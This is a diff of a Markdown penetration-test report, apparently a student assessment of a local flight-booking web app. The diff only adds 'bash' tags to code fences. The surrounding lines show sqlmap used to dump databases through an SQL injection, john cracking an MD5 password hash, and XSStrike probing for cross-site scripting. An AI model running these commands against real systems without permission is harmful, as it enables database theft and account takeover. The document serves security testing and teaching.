@@ -65,7 +65,7 @@ We looked through the java code manually but was not able to determine any vulne
 
 We noticed that it is build with the secure MVC (Model-View-Controller) design pattern.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/…/desktop-app/src/dk/kea]
 └─$ tree
 .
@@ -211,7 +211,7 @@ Plus three additional low level vulnerabilities:
 ### SQL Map:
 Since we found an SQL injection on the `booking.html` page, we will run `sqlmap` to enumerate and hopefully dump all the databases.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/flybook]
 └─$ sqlmap -u 'http://localhost:8000/api/API.php?API_KEY=Flight%20booker%201.2%20plus%20edition&action=get&items=flights&date=2018-05-01&from=%202341&to=%201' --dump    
         ___
@@ -366,7 +366,7 @@ It looks like the password is hashed.
 
 We can use `hashid` is try and detect the hash function used.
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ hashid a12dc5bac0376c86401ffa437cc24ade
 Analyzing 'a12dc5bac0376c86401ffa437cc24ade'
@@ -394,7 +394,7 @@ One of the `MD` hash functions was likely used, and since MD5 is the most common
 
 Let's save the hash to a file.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ echo 'a12dc5bac0376c86401ffa437cc24ade' > hash.txt
 ```
@@ -409,7 +409,7 @@ Command: `john --format=raw-md5 -w=list.txt hash.txt`
 
 `hash.txt`: The hash.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ john --format=raw-md5 -w=list.txt hash.txt
 Using default input encoding: UTF-8
@@ -440,7 +440,7 @@ There is reflections on the site, delivered with JavaScript.
 ![](./attachments/Pasted%20image%2020220513165821.png)
 
 XSStrike:
-```
+```bash
 ┌──(kali㉿kali)-[~/XSStrike]
 └─$ python xsstrike.py -u "http://localhost:8000/api/API.php?API_KEY=Flight+booker+1.2+plus+edition&action=get&items=airport&search=" 
 
